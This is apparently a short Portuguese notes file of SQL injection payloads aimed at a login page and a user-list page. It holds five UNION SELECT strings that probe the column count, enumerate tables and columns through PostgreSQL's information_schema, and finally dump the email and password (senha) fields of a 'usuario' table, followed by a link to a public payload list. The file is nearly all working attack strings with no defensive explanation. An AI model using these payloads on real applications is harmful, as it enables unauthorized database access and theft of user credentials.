- SQL Injection (Login)
- SQL Injection (Lista de usuários)
```sql
' union select 1, '2', '3', '4', '5', '6', 1, now(), now()--
```
```sql
' union select floor(random() * 1000), '2', table_name, '4', '5', '6', 1,now(), now() from information_schema.tables where table_schema = 'public'--
```
```sql
' union select floor(random() * 1000), table_name, column_name, '4', '5', '6', 1,now(), now() from information_schema.columns where table_schema = 'public'--
```
```sql
' union select floor(random() * 1000), '2', string_agg(column_name,','), '4', '5', '6', 1,now(), now() from information_schema.columns where table_name = 'usuario'--
```
```sql
' union select floor(random() * 1000), '2', concat(email,' ' ,senha), '4', '5', '6', 1,now(), now() from usuario--
```

[SQL Injection Payload List](https://github.com/payloadbox/sql-injection-payload-list)